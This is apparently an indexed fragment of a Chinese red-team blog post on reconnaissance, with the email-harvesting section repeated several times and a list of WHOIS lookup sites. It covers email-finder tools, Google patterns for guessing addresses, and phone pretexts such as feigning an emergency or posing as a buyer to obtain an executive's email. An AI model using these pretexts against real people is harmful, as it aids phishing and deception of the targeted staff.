1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#分类目标单位类型"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#邮件服务入口"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#在线搜索邮件"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#theharvester"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#验证账户有效性"},{"categories":["hvv"],"content":"\r0x07 Whois 查询通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。 名称 地址 站长之家域名WHOIS信息查询地址 http://whois.chinaz.com/ 爱站网域名WHOIS信息查询地址 https://whois.aizhan.com/ 腾讯云域名WHOIS信息查询地址 https://whois.cloud.tencent.com/ 美橙互联域名WHOIS信息查询地址 https://whois.cndns.com/ 爱名网域名WHOIS信息查询地址 https://www.22.cn/domain/ 易名网域名WHOIS信息查询地址 https://whois.ename.net/ 中国万网域名WHOIS信息查询地址 https://whois.aliyun.com/ 西部数码域名WHOIS信息查询地址 https://whois.west.cn/ 新网域名WHOIS信息查询地址 http://whois.xinnet.com/domain/whois/index.jsp 纳网域名WHOIS信息查询地址 http://whois.nawang.cn/ 中资源域名WHOIS信息查询地址 https://www.zzy.cn/domain/whois.html 三五互联域名WHOIS信息查询地址 https://cp.35.com/chinese/whois.php 新网互联域名WHOIS信息查询地址 http://www.dns.com.cn/show/domain/whois/index.do 国外WHOIS信息查询地址 https://who.is/ 